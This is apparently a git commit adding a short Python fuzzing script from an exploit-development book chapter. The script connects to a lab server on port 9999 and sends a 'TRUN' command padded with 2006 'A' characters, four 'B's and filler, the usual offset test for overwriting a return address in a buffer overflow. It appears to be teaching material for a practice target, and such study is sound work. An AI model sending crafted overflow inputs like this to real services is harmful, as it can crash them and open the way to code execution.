1de862b6da43634380592123bfa34073c635deb8
Skillhh <ortegon.giovanny@hotmail.com>
2021-01-09 20:21:21 -0500

    [ADD] fuzzing buffer overflow

---
+++ book/chap06/fuzzing-1.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python
+import socket
+
+server = '192.168.1.72'
+sport = 9999
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((server, sport))
+print s.recv(1024)
+
+buffer = ''
+buffer += 'A' * 2006
+buffer += 'B' * 4
+buffer += 'C' * (5000-2006-4)
+s.send(('TRUN .' + buffer + '\r\n'))
+print s.recv(1024)
+s.send('EXIT\r\n')
+print s.recv(1024)
+s.close()
